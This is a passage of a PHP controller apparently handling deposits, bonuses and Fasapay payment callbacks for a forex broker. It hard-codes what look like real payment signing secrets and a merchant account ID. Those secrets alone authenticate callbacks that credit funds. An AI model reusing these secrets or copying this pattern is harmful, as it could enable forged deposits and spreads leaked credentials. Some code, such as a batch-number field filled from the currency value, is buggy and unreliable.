        $conv_amount = $this->get_convert_amount(trim($data['account']['mt_currency_base']), $deposit_amount, trim('EUR'));
        if ((!$depositData) || (floatval($conv_amount) > floatval(2000))) {
            return false;
        } else {
            return lang('dpst_msg21').'<a href="'.FXPP::my_url('profile/upload-documents').'">here</a>.';
        }
    }

    public function non_verified_notice()
    {
        if ($account_detail = $this->general_model->whereConditionQuery($this->session->userdata('user_id'))) {
            if (FXPP::isEUGroup($account_detail['account_number'])) {
                return false;
            }
        }

        return false;
        // removed FXPP-9770
        /* $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id'));
          $notice = 'Please verify your account '.'<a href="'.FXPP::my_url('profile/upload-documents').'"> here</a>.';

          $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
          if ($isMicro) {
              $data['non_verified_notice'] = !$data['count_status']?$notice: lang('dpst_msg21-micro').' <a href="'.FXPP::my_url('profile/upload-documents').'">here</a>.';
          }else{
              $data['non_verified_notice'] = !$data['count_status']?$notice: lang('dpst_msg21').' <a href="'.FXPP::my_url('profile/upload-documents').'">here</a>.';
          }

          return  $data['non_verified_notice'];*/

        /*  $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id'));
          $notice = lang('dpst_msg22_01') . '<a href="' . FXPP::my_url('profile/upload-documents') . '"> here</a>.';
//        $data['non_verified_notice'] = !$data['count_status']?$notice:'To continue depositing, verify your account before reaching maximum amount of 2000 EUR or equivalent. '.$notice;
          $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
          if ($isMicro) {
              $data['non_verified_notice'] = 'To continue depositing, verify your account before reaching maximum amount of 200000 cents. ' . $notice;
          } else {
              $data['non_verified_notice'] = 'To continue depositing, verify your account before reaching maximum amount of 2000 EUR or equivalent. ' . $notice;
          }

          //$data['non_verified_notice'] = lang('dpst_msg22_01').$notice;
          return $data['non_verified_notice'];*/
    }

    public function insertUnprocessedBonus($user_id, $account_number, $amountDeposited, $type, $bonus = 'tpb', $DepositTransaction)
    {
        $date_bonus_before_acquired = date('Y-m-d H:i:s');
        $bonusArray = [
            'AmountDeposited' => $amountDeposited,
            'AmountBonus' => 0,
            'DateProcessed' => '0000-00-00 00:00:00',
            'UserId' => $user_id,
            'AccountNumber' => $account_number,
            'TransactionPage' => $type,
            'Ticket' => 0,
            'BonusType' => $bonus,
            'DepositId' => $DepositTransaction,
            'BonusStatus' => 1,
            'DateBeforeProcessed' => $date_bonus_before_acquired,
        ];

        $this->deposit_model->insertDepositBonus($bonusArray);
    }

    public function __destruct()
    {
        $user_id = $this->session->userdata('user_id');
        $account = $this->account_model->getAccountByUserId($user_id);
        $hasAutoLeverage = $this->account_model->hasUserAutoLeverage($user_id);
        if ($hasAutoLeverage === true) {
            if (count($account) > 0) {
                $leverage = count($ex_leverage = explode(':', $account['leverage'])) > 1 ? $ex_leverage[1] : 200;
                if ($leverage > 500) {
                    $webservice_config = [
                        'server' => 'live_new',
                    ];
                    $WebService = new WebService($webservice_config);
                    $WebService->request_live_account_balance($account['account_number']);
                    if ($WebService->request_status === 'RET_OK') {
                        $amount = $WebService->get_result('Balance');
                        $this->account_model->updateAmountByAccountNumber($account['account_number'], $amount);
                        $isupdated = FXPP::leverage_auto_change();
                        if ($isupdated) {
                            $data['updatebydeposit'] = [
                                'auto_leverage_change_deposit' => 1,
                            ];
                            $this->general_model->updatemy('mt_accounts_set', 'user_id', $user_id, $data['updatebydeposit']);
                        }
                    }
                }
            }
        }

//        if(IPLoc::Office()){
        $this->load->model('Task_model');

        if (isset($_SESSION['user_id'])) {
            $userid = $_SESSION['user_id'];
            $accountnumber = $_SESSION['account_number'];

            $deposittransaction = $this->Task_model->getdeposittoday($userid);
            //$accountnumber=$_SESSION['account_number'];
            if ($deposittransaction) {
                $users = $this->general_model->showssingle($table = 'users', $field = 'id', $id = $userid, $select = 're_add_agent_tag,nodepositbonus', $order_by = '');
                if ($users) {
                    // echo 're_add_agent_tag='.$users['re_add_agent_tag'];
                    if ($users['re_add_agent_tag'] == 1) {
                        /*do nothing agent has already been added*/
                    } else {
                        if ($users['nodepositbonus'] == 1) {
                            $webservice_config = ['server' => 'live_new'];
                            $WSRAD = new WebService($webservice_config);
                            //                        $account_info = array('iLogin' => $_SESSION['account_number']);
                            $account_info = ['iLogin' => $accountnumber];
//                            $WSRAD->open_RequestAccountDetails($account_info);

                            $this->load->library('WSV'); //New web service
                            $WSV = new WSV();
                            $WSRAD = $WSV->GetAccountDetailsSingle($account_info, $webservice_config);

                            if ($WSRAD->request_status === 'RET_OK') {
//                                $GetAgent = $WSRAD->get_result('Agent');
                                $GetAgent = $WSRAD->result['Agent'];

                                if ($GetAgent) {
                                    //agent is available in api
                                } else {
                                    $uac = $this->general_model->showssingle($table = 'users_affiliate_code', $field = 'users_id', $id = $userid, $select = 'referral_affiliate_code', $order_by = '');
                                    if ($uac) {
                                        $this->load->model('account_model');
                                        $getAccountNumberByAffiliateCode = $this->account_model->getAccountNumberByCode($uac['referral_affiliate_code']);
                                        $AgentAccountNumber = $getAccountNumberByAffiliateCode['account_number'];

                                        $service_data = [
                                            'AccountNumber' => $accountnumber,
                                            'AgentAccountNumber' => $AgentAccountNumber,
                                        ];
                                        $webservice_config = [
                                            'server' => 'live_new',
                                        ];
//                                        $WS_SAA = new WebService($webservice_config);
//                                        $WS_SAA->SetAccountAgent($service_data);

                                        if (IPLoc::APIUpgradeDevIP()) {
                                            $this->load->library('WSV'); //New web service
                                            $WSV = new WSV();
                                            $WS_SAA = $WSV->SetAccountDetail($service_data, 'SetAgentAccount');
                                        } else {
                                            $WS_SAA = new WebService($webservice_config);
                                            $WS_SAA->SetAccountAgent($service_data);
                                        }

                                        if ($WS_SAA->request_status === 'RET_OK') {
                                            $datasave = [
                                                're_add_agent_tag' => 1,
                                            ];
                                            $this->general_model->updatemy($table = 'users', $field = 'id', $id = $userid, $datasave);
                                            $datainsert = [
                                                'user_id' => $userid,
                                                'account_number' => $accountnumber,
                                                'agent' => $AgentAccountNumber,
                                                'date' => FXPP::getCurrentDateTime(),
                                            ];
                                            $this->general_model->insertmy($table = 'returned_agents_log', $datainsert);
                                        }
                                    }
                                }
                            } else {
                                //service error in get account details
                            }
                        }
                    }
                }
            }
        }
//        }
    }

    public function CurrentAndPendingTradesValidation()
    {
        $webservice_config = ['server' => 'live_new'];
        $WebService = new WebService($webservice_config);
        $data['mtas'] = $this->g_m->showssingle2($table = 'mt_accounts_set', $field = 'user_id', $id = $_SESSION['user_id'], $select = 'account_number');

        $account_info = [
            'iLogin' => $data['mtas']['account_number'],
        ];
        $returnData = [
            'TradeError' => true,
            'TradeErrorMsg' => 'Webservice Error',
        ];

        $WebService->open_GetAccountActiveTrades($account_info);
        $TradeStatus = $WebService->request_status;
        if ($TradeStatus === 'RET_OK') {
            $tradatalist = (array) $WebService->get_result('TradeDataList');
            if (empty($tradatalist)) {
                $CurrentTradeRes = false;
            }
        }
        if ($CurrentTradeRes === false) {
            $WebService->GetAccounPendingOrders($account_info);
            $TradeStatusPending = $WebService->request_status;
            if ($TradeStatusPending === 'RET_OK') {
                $tradatalistPending = (array) $WebService->get_result('TradeDataList');
                if (empty($tradatalistPending)) {
                    $returnData['TradeError'] = false;
                    $returnData['TradeErrorMsg'] = '';

                    return $returnData;
                } else {
                    $returnData['TradeErrorMsg'] = lang('dpst_msg19');

                    return $returnData;
                }
            }

            return $returnData;
        }

        $returnData['TradeErrorMsg'] = lang('dpst_msg19');

        return $returnData;
    }

    public function NodepositBonusValidation($user_id)
    {
        $getAccountNumberForBonus = $this->account_model->getAccountByUserId($user_id);
        $AccountNumber = $getAccountNumberForBonus['account_number'];
        $bonuses = FXPP::getAccountBonusByType($AccountNumber);

        if (!empty($bonuses[2]) and $bonuses[2] > 0) {
            return 2;
        }
    }

    public function fasapay()
    {
        //redirect(FXPP::loc_url('deposit'));

        if ($this->session->userdata('logged')) {
            $user_id = $this->session->userdata('user_id');

            $data['amount'] = $this->input->post_get('amount1', true);

            $data['bounusfiled'] = $this->input->get('bonus', true);
            $data['additional_bonus'] = $this->input->get('addBonus', true);

            if ($this->session->userdata('login_type') == 1) {
                $getCur = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['currency'];
                $acc_number = $getCur['reference_num'];
            } else {
                $getCur = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['mt_currency_base'];
                $acc_number = $getCur['account_number'];
            }

            $field_value = '';
            if ($_POST) {
                $field_value = [
                    'sum' => $this->input->post('sum'),
                    'account' => $this->input->post('account'),
                    'currency' => $this->input->post('currency'),
                ];
            }

            // if ($data['amount'] == null) {
            $this->form_validation->set_rules('account', 'Fasapay account number', 'trim|required|xss_clean');
            $currency = $this->input->post('currency', true);
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('sum', 'Deposit amount', "trim|required|deposit_min_amount[$currency]");

            //}

            $data['test'] = '';
            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));
//            $data['account_info'] = $this->general_model->whereCondition('all_accounts', array('user_id' => $user_id));
            $data['account_info'] = $this->general_model->whereConditionQuery($user_id);
            if ($this->form_validation->run() && !$data['error_msg']) {
                // $fasapay['link'] = "https://sci.fasapay.com/";
                //  $fasapay['fp_acc'] =  "FP292042"; //"FP292042" // "FPX5742";

                // FXPP-11809
                $fasapay['link'] = 'https://sci.fasapay.com/';
                $fasapay['fp_acc'] = 'FP615967';

                $fasapay['fp_acc_by'] = $this->input->post('account', true);
                $fasapay['fp_acc_from'] = $this->input->post('account', true);
                $fasapay['fp_amnt'] = $this->input->post('sum', true);
                $fasapay['fp_currency'] = $this->input->post('currency', true);
                $fasapay['fp_success_url'] = FXPP::loc_url('deposit/fasapay_success');
                $fasapay['fp_fail_url'] = FXPP::loc_url('deposit/fasapay_fail');
                $fasapay['fp_status_url'] = FXPP::loc_url('deposit/fasapay_status');
                $fasapay['fp_status_form'] = FXPP::loc_url('deposit/fasapay_status_form');
                $fasapay['track_id'] = 'FP'.date('Ymdhis').rand(0, 9);
                $fasapay['order_id'] = 'FP'.date('Ymdhis').rand(0, 9);
                $fasapay['bonus'] = $data['bounusfiled'];
                $fasapay['fp_comments'] = 'ForexMart Deposit (Fasapay - ['.$acc_number.'])';

                $additional_bonus = $this->validateAdditionalBonus($data['additional_bonus']);

                $insertData = [
                        'fp_acc' => $fasapay['fp_acc_by'],
                        'fp_amnt' => $fasapay['fp_amnt'],
                        'fp_currency' => $fasapay['fp_currency'],
                        'fp_comments' => 'Fasapay deposit',
                        'track_id' => $fasapay['track_id'],
                        'order_id' => $fasapay['order_id'],
                        'bonus' => $data['bounusfiled'],
                        'create_date' => date('Y-m-d h:i:s'),
                        'user_id' => $user_id,
                        'additional_tenp_bonus' => $additional_bonus,
                    ];

                $this->general_model->insertmy('fasapay', $insertData);

                $this->load->view('deposits/fasapay_payment', $fasapay);
            } else {
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }
                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $data['field_value'] = $field_value;
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //  $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
                $this->template->title('ForexMart | Deposit - Fasapay')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                     <script src='".$this->template->Js()."custom-deposit.js'></script>
                            ")
                    ->build('deposits/fasapay', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function fasapay_status_form()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'status_form'];
        $this->general_model->insertmy('fasapay_log', $insertData);
    }

    public function fasapay_status()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'status'];
        $this->general_model->insertmy('fasapay_log', $insertData);

        /* a:15:{s:9:"fp_paidto";s:7:"FPX5742";s:9:"fp_paidby";s:7:"FPX7108";s:7:"fp_amnt";s:8:"2000.000";
             s:11:"fp_fee_amnt";s:7:"100.000";s:11:"fp_fee_mode";s:3:"FiR";s:8:"fp_total";
             s:4:"1900";s:11:"fp_currency";s:3:"IDR";s:14:"fp_batchnumber";s:15:"TR2017031661466";
             s:8:"fp_store";s:0:"";s:12:"fp_timestamp";s:19:"2017-03-16 14:09:34";s:15:"fp_merchant_ref";
             s:0:"";s:8:"track_id";s:15:"201703160708587";s:8:"order_id";s:15:"201703160708586";
             s:5:"bonus";s:0:"";s:3:"yt0";s:18:"Return To Merchant";} */
        $tnxData = [
            'fp_acc' => $this->input->post('fp_paidby', true),
            'fp_amnt' => $this->input->post('fp_amnt', true),
            'fp_fee_amnt' => $this->input->post('fp_fee_amnt', true),
            'fp_total' => $this->input->post('fp_total', true),
            'bonus' => $this->input->post('bonus', true),
            'order_id' => $this->input->post('order_id', true),
            'track_id' => $this->input->post('track_id', true),
            'fp_currency' => $this->input->post('fp_currency', true),
            'fp_batchnumber' => $this->input->post('fp_currency', true),
            'fp_timestamp' => $this->input->post('fp_timestamp', true),
        ];

        ///Building String to calculate hash
        $msg = '';
        $msg .= $_REQUEST['fp_paidto'].':';
        $msg .= $_REQUEST['fp_paidby'].':';
        $msg .= $_REQUEST['fp_store'].':';
        $msg .= $_REQUEST['fp_amnt'].':';
        $msg .= $_REQUEST['fp_batchnumber'].':';
        $msg .= $_REQUEST['fp_currency'].':';
        $msg .= 'FXMartFasapay';

        //calculate hash
        $hash = hash('sha256', $msg);

        if (isset($_REQUEST['fp_hash']) && $hash == $_REQUEST['fp_hash']) {
            if ($fasapay = $this->general_model->whereCondition('fasapay', ['fp_acc' => $tnxData['fp_acc'], 'order_id' => $tnxData['order_id'], 'track_id' => $tnxData['track_id'], 'status' => 1])) {
                if ($fasapay['type'] == 'IFX') {
                    $fasapay['track_id'] = $this->input->post('track_id', true); //"FP" . date('Ymdhis') . rand(0, 9);
                    $fasapay['order_id'] = $this->input->post('order_id', true); //"FP" . date('Ymdhis') . rand(0, 9);
                    $fasapay['bonus'] = 0;
                    $fasapay['fp_comments'] = $this->input->post('fp_comments', true);
                    $fasapay['account_number'] = $this->input->post('account_number', true);

                    // account_number:order_id:track_id:fp_account:fp_amt:fp_comments:fp_currency:fp_fail_url:fp_status_url:fp_success_url:0e8_7WKv8s%DVi01J
                    $ifx = '';
                    $ifx .= $fasapay['user_id'].':';
                    $ifx .= $_REQUEST['order_id'].':';
                    $ifx .= $_REQUEST['track_id'].':';
                    $ifx .= $_REQUEST['fp_paidby'].':';
                    $ifx .= $_REQUEST['fp_amnt'].':';
                    $ifx .= $_REQUEST['fp_comments'].':';
                    $ifx .= $_REQUEST['fp_currency'].':';
                    $ifx .= $fasapay['fp_fail_url'].':';
                    $ifx .= $fasapay['fp_status_url'].':';
                    $ifx .= $fasapay['fp_success_url'].':';
                    $ifx .= '0e8_7WKv8s%DVi01J';

                    //calculate hash
                    $hash = hash('sha256', $ifx);
                    $_REQUEST['ifx_hash'] = $hash;
                    if (FXPP::SendPOSTRequest($fasapay['fp_status_url'], $_REQUEST) == 'payment successful') {
                        $update_data = [
                            'status' => 2,
                            'fp_amnt_fee' => $tnxData['fp_amnt_fee'],
                            'fp_timestamp' => $tnxData['fp_timestamp'],
                        ];
                        $this->general_model->updatemyw2('fasapay', 'track_id', $tnxData['track_id'], 'order_id', $tnxData['order_id'], $update_data);

                        return true;
                    } else {
                        $update_data = [
                            'status' => 5,
                            'fp_amnt_fee' => $tnxData['fp_amnt_fee'],
                            'fp_timestamp' => $tnxData['fp_timestamp'],
                        ];
                        $this->general_model->updatemyw2('fasapay', 'track_id', $tnxData['track_id'], 'order_id', $tnxData['order_id'], $update_data);

                        return true;
                    }
                }

                //  if($fasapay['fp_amnt'] == $tnxData['fp_amnt']){
                $insertData['log'] = serialize($tnxData);

                //  $inv = $this->general_model->showssingle("deposit", "transaction_id", $tnxData['track_id'] , "*");
//            $accData = $this->general_model->whereCondition('all_accounts', array('user_id' => $fasapay['user_id']));
                $accData = $this->general_model->whereConditionQuery($fasapay['user_id']);

                /* FXPP-6333 */
                $currencyStatus = $this->currency_status[$accData['currency']];
                $isMicro = $this->account_model->isMicro($fasapay['user_id']);
                if ($isMicro) {
                    $fasapay['fp_amnt'] *= 100;
                    $tnxData['fp_total'] *= 100;
                    $tnxData['fp_fee_amnt'] *= 100;

                    $currencyStatus = $this->currency_status['Cents'];
                }
                /* FXPP-6333 */

                $total_conv_amount = $this->get_convert_amount($fasapay['fp_currency'], $fasapay['fp_amnt'], $accData['currency']);
                $conv_amount = $this->get_convert_amount($fasapay['fp_currency'], $tnxData['fp_total'], $accData['currency']);

                $conv_amount_fee = $this->get_convert_amount($fasapay['fp_currency'], $tnxData['fp_fee_amnt'], $accData['currency']);

                $conv_amount_usd = $this->get_convert_amount($fasapay['fp_currency'], $tnxData['fp_total']);
                $conv_amount_fee_usd = $this->get_convert_amount($fasapay['fp_currency'], $tnxData['fp_fee_amnt']);

                $insertDepositFailed = [
                    'transaction_id	' => $tnxData['track_id'],
                    'status	' => 0,
                    'amount	' => $total_conv_amount,
                    'currency' => $fasapay['fp_currency'],
                    'user_id' => $fasapay['user_id'],
                    'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                    'transaction_type' => 'FASAPAY',
                    'payment_status' => $this->paymentType_status['Deposit via Fasapay'], //FXPP-7618,
                    'currency_status' => $currencyStatus,
                    'fee' => $conv_amount_fee,
                    'isFailed' => 0,
                    'type' => 'deposit-'.$isMicro.'-'.$fasapay['bonus'],
                ];

                $data = [
                    'transaction_id' => $tnxData['track_id'],
                    'reference_id' => $tnxData['order_id'],
                    'status' => 2,
                    'amount' => $conv_amount,
                    'currency' => $fasapay['fp_currency'],
                    'user_id' => $fasapay['user_id'],
                    'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                    'note' => 'Fasapay deposit',
                    'transaction_type' => 'FASAPAY',
                    'conv_amount' => $conv_amount_usd,
                    'payment_status' => $this->paymentType_status['Deposit via Fasapay'], //FXPP-7618,
                    'currency_status' => $currencyStatus,
                ];

                if ($tnxData['fp_fee_amnt'] > 0) {
                    $data_fee = [
                        'transaction_id' => $tnxData['track_id'],
                        'reference_id' => $tnxData['order_id'],
                        'status' => 2,
                        'amount' => $conv_amount_fee,
                        'currency' => $fasapay['fp_currency'],
                        'user_id' => $fasapay['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'Fasapay deposit',
                        'transaction_type' => 'FASAPAY',
                        'conv_amount' => $conv_amount_fee_usd,
                        'payment_status' => $this->paymentType_status['Deposit via Fasapay'], //FXPP-7618,
                        'currency_status' => $currencyStatus,
                    ];
                }

                $config = [
                    'server' => 'live_new',
                ];
//                $WebService = new WebService($config);

                $account_number = $accData['account_number'];

                // if(IPLoc::APIUpgradeDevIP()){
                $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['FASAPAY'].$tnxData['track_id']);
                $requestResult = $WebServiceNew['requestResult'];
                $ticket = $WebServiceNew['ticket'];
                /*}else{
                    $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type['FASAPAY'] . $tnxData['track_id']);
                    $requestResult = $WebService->request_status;
                    $ticket        = $WebService->get_result('Ticket');
                }*/

                if ($requestResult === 'RET_OK') {
                    $data['mt_ticket'] = $ticket;

                    // Back Agent of Client
                    FXPP::BackAgentOfAccount($account_number);
                } else {
                    $insertDepositFailed['comment'] = $requestResult;
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }

                if ($tnxData['fp_fee_amnt'] > 0) {
//                    $WebService = new WebService($config);
                    $account_number = $accData['account_number'];

                    // if(IPLoc::APIUpgradeDevIP()){
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['FASAPAY'].$tnxData['track_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
                    /*}else{
                        $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type['FASAPAY'] . $tnxData['track_id']);
                        $requestResult = $WebService->request_status;
                        $ticket        = $WebService->get_result('Ticket');
                    }*/

                    if ($requestResult === 'RET_OK') {
                        $data_fee['mt_ticket'] = $ticket;
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                } else {
                    $insertDepositFailed['comment'] = 'fee is '.$tnxData['fp_fee_amnt'];
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }

                $this->SetAccountAgentPotentialFund($account_number);

                $deposit_id = $this->deposit_model->insertPayment($data);
                if ($tnxData['fp_fee_amnt'] > 0) {
                    $this->deposit_model->insertPayment($data_fee);
                }
//                FXPP::updateAccountTradingStatus($account_number,$fasapay['user_id']); // for pro accounts

                /*if(IPLoc::APIUpgradeDevIP()){
                    FXPP::updateAccountTradingStatusV2($account_number,$fasapay['user_id']); // for pro accounts
                }else{*/
                FXPP::updateAccountTradingStatus($account_number, $fasapay['user_id']); // for pro accounts
                // }

                /* ========================================== Welcome bonus================================================ **/


//                if ($fasapay['bonus'] == 'twpb') {
//                    // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                    FXPP::DepositBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', 'twpb', $tnxData['track_id']);
//                }
//
//                if ($fasapay['bonus'] == 'tpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                    FXPP::DepositBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', 'tpb', $tnxData['track_id']);
//                }
//                if ($fasapay['bonus'] == 'fpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                    FXPP::DepositBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', 'fpb', $tnxData['track_id']);
//                }
//
//                if ($fasapay['bonus'] == 'hpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                    FXPP::Deposit100PercentBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', 'hplb', $tnxData['track_id']);
//                }
//
//                if (IPLoc::Office()) {
//                    if ($fasapay['bonus'] == 'rhpb') {
//                        FXPP::DepositRegular100PercentBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', 'rhpb', $tnxData['track_id']);
//                    }
//                }
//
//                if ($fasapay['additional_tenp_bonus'] == 1) {
//                    // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                    FXPP::DepositBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', 'tenpb', $tnxData['track_id']);
//                }

                self::applyDepositBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', $fasapay['bonus'], $tnxData['track_id'], false);

                if ($fasapay['additional_tenp_bonus'] == 1) {
                    self::applyDepositBonus($fasapay['user_id'], $account_number, $total_conv_amount, 'fasapay', 'tenpb', $tnxData['track_id'], true);
                }

                $bonuses = FXPP::getAccountBonusByType($account_number);
                $RequestLogintype = $this->account_model->getAccountLoginType($fasapay['user_id']);
                if ($RequestLogintype['login_type'] != 1) {
                    if ($total_conv_amount > 0 and $bonuses[2] > 0) {
                        FXPP::BonusProfitCancellation($fasapay['user_id'], $account_number, $total_conv_amount, $tnxData['track_id']);
                    }
                }

                // Bonus Profit Logs**/
                $ndbProfitLogs = [
                    'Account_number' => $account_number,
                    'DepAmount' => $total_conv_amount,
                    'UserId' => $fasapay['user_id'],
                    'TransactionId' => $tnxData['track_id'],
                    'ndbbonus' => $bonuses[2],
                ];
                $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                $insertProfitLogs = [
                    'logs' => $encodeNdbProfitLogs,
                    'User_Id' => $fasapay['user_id'],
                ];

                $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                $fpamount = $conv_amount_usd + $conv_amount_fee_usd;
                /**  Use original amount for Cent accounts* */
                $isMicro = $this->account_model->isMicro($fasapay['user_id']);
                if ($isMicro) {
                    $fpamount = ($conv_amount_usd + $conv_amount_fee_usd) / 100;
                }
                /* End * */

                /* Send successful email deposit to auto-reports **/
                $this->sendEmailAfterSuccessDeposit('fasapay', $fpamount, $account_number, $fasapay['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['FASAPAY'].$tnxData['track_id']);
                /* End **/
            }
        } else {
            $this->general_model->updatemyw2('fasapay', 'track_id', $tnxData['track_id'], 'order_id', $tnxData['order_id'], ['status' => 9]);
        }

        redirect('deposit/fasapay');
    }

    public function sendEmailAfterSuccessDeposit_test($type, $conv_amount, $account_number, $user_id, $comment, $currency = null)
    {
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'country');
        $user_tag = $this->general_model->showssingle('users', 'id', $user_id, 'test,test_1');
        $agent_account_number = '';

        // Retrieve account's agent information
        $referral_aff_code = $this->account_model->getUserReferralCode($user_id);

        if ($referral_aff_code['referral_affiliate_code'] != null || !empty($referral_aff_code['referral_affiliate_code'])) {
            $agent_info = $this->account_model->getUserAffiliateAgent($referral_aff_code['referral_affiliate_code']);
            if ($this->account_model->getAccountByPartnerId($agent_info['user_id'])) {
                $agent_account_number = $this->account_model->getAccountByPartnerId($agent_info['user_id']);
            } elseif ($this->account_model->getAccountByUserId($agent_info['user_id'])) {
                $agent_account_number = $this->account_model->getAccountByUserId($agent_info['user_id']);
            }
        } else {
            $agent_info = null;
            $agent_account_number = null;
        }

        $count = $this->deposit_model->getNumberOfDepositsByUser($user_id);

        if ($type === 'Skrill') {
            $count = $count + 1;
        }

        if ($user_tag['test'] != 1 && $user_tag['test_1'] != 0) {
            $email_data = [
                'type' => $type,
                'title' => '['.$type.']['.$conv_amount.'] - ACC ['.$account_number.']',
                'amount' => number_format($conv_amount, 2, '.', ''),
                'account_number' => $account_number,
                'ip' => $this->input->ip_address(),
                'country' => $this->general_model->getCountries($user_info['country']),
                'agent' => $agent_info == null ? 'N/A' : $agent_info['full_name'].' - ACC ['.$agent_account_number['account_number'].']',
                'comment' => $comment,
                'count' => $count,
            ];
            $this->load->library('Fx_mailer');
            Fx_mailer::successful_deposit_test($email_data, $currency);
        } else {
            // $this->sendEmailAfterSuccessDeposit2($type, $conv_amount, $account_number, $user_id, $comment);
        }
    }

    public function fasapay_fail()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'fail'];
        $this->general_model->insertmy('fasapay_log', $insertData);

        if ($fasapay = $this->general_model->whereCondition('fasapay', ['fp_acc' => $this->input->post('fp_acc'), 'order_id' => $this->input->post('order_id'), 'track_id' => $this->input->post('track_id'), 'status' => 1])) {
            if ($fasapay['type'] == 'IFX') {
                redirect($fasapay['fp_fail_url']);
            }
        }

        redirect(FXPP::loc_url('deposit/fasapay'));
    }

    public function fasapay_success()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'success'];
        $this->general_model->insertmy('fasapay_log', $insertData);
        if ($fasapay = $this->general_model->whereCondition('fasapay', ['fp_acc' => $this->input->post('fp_acc'), 'order_id' => $this->input->post('order_id'), 'track_id' => $this->input->post('track_id'), 'status' => 1])) {
            if ($fasapay['type'] == 'IFX') {
                redirect($fasapay['fp_success_url']);
            }
        }
        redirect(FXPP::loc_url('deposit/fasapay'));
    }

    public function emerchantpay()
    {
        if (!IPLoc::Office()) {
            redirect('');
        }

        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();

            $user_id = $this->session->userdata('user_id');
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);
            // if ($data['amount'] == null) {
            //$this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
            $this->form_validation->set_rules('card_holder_name', 'Card holder name', 'trim|required|xss_clean');
            $this->form_validation->set_rules('card_number', 'Card number', 'trim|required|xss_clean');
            $this->form_validation->set_rules('cardcv2', 'CVV', 'trim|required|xss_clean');
            $this->form_validation->set_rules('card_expiry_month', 'Card expiry month', 'trim|required|xss_clean');
            $this->form_validation->set_rules('card_expiry_year', 'Card expiry year', 'trim|required|xss_clean');
            //  }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($user_id);
//            $hasInNdbBonus = $this->NodepositBonusValidation($user_id);
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                //if ($this->form_validation->run()) {
                $bonus_type = $this->input->post('bounusfiled');
